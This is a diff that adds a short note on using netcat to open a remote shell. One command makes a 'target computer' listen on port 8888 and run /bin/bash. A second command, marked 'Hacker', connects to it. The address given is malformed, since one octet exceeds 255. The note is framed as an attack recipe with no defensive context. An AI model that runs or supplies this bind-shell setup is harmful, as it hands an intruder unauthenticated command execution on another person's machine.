@@ -1,0 +1,7 @@
+# Netcat can remote control terminal
+
+# Target computer
+nc -l -p 8888 -e /bin/bash
+
+# Hacker
+nc 192.160.983.21 8888
